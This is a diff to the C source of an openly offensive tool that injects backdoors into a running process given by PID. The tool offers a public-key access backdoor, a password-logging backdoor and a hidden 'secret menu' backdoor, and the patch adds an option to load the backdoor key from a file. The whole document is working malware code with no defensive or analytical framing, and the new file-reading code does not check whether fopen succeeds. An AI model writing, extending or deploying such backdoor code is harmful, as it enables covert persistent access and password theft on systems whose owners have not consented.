@@ -170,7 +170,8 @@ void usage(char *prog) {
 		fprintf(stderr,
 			" usage: %s [options] <pid>\n\n"
 			" valid options:\n"
-			"   -p <pubkey>     activate publickey backdoor\n"
+			"   -p <pubkey>     activate publickey backdoor with pubkey string\n"
+			"   -P <key.pub>    activate publickey backdoor with pubkey file\n"
 			"   -l <filename>   activate password logging backdoor\n"
 			"   -m              activate secret menu backdoor\n"
 			"\n", prog
@@ -181,6 +182,7 @@ int main(int argc, char *argv[]) {
 	int c;
 	char *pubkey_value = NULL;
 	char *passlog_path = NULL;
+	char *pubkey_file = NULL;
 	int  menu_activate = 0;
 
 	banner();
@@ -190,10 +192,14 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 
-	while((c = getopt(argc-1, argv, "p:l:m")) != -1) {
+	while((c = getopt(argc-1, argv, "p:P:l:m")) != -1) {
 		switch(c) {
 			case 'p':
 				pubkey_value = optarg;
+			break;
+
+			case 'P':
+				pubkey_file = optarg;
 			break;
 
 			case 'l':
@@ -206,7 +212,12 @@ int main(int argc, char *argv[]) {
 		}
 	}
 
-	if (pubkey_value == NULL && passlog_path == NULL && menu_activate == 0) {
+	if (pubkey_file == NULL && pubkey_value == NULL && passlog_path == NULL && menu_activate == 0) {
+		usage(argv[0]);
+		return -1;
+	}
+
+	if (pubkey_value != NULL && pubkey_file != NULL) {
 		usage(argv[0]);
 		return -1;
 	}
@@ -230,10 +241,20 @@ int main(int argc, char *argv[]) {
 		inject_ctx_map_reload(ctx);
 	}
 
-	if (pubkey_value != NULL) {
+	if (pubkey_value != NULL || pubkey_file != NULL) {
 		info("installing pubkey backdoor..");
 
-		backdoor_pubkey_install(ctx, argv[2]);
+		if (pubkey_file != NULL) {
+			FILE *f = fopen(pubkey_file, "rb");
+			char keybuf[2048];
+			memset(keybuf, 0, 2048);
+			fgets(keybuf, 2047, f);
+			fclose(f);
+			backdoor_pubkey_install(ctx, keybuf);
+		} else {
+			backdoor_pubkey_install(ctx, pubkey_value);
+		}
+
 		inject_ctx_map_reload(ctx);
 	}
 
